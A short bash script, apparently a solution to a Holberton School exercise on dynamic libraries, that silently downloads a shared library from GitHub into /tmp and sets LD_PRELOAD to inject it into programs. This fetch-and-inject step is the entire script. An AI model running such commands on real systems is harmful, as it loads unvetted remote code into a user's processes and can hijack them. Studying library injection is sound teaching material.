#!/bin/bash
wget -q -O /tmp/inject.so https://github.com/dannyhollman/holbertonschool-low_level_programming/blob/master/0x18-dynamic_libraries/inject.so?raw=true
export LD_PRELOAD=/tmp/inject.so
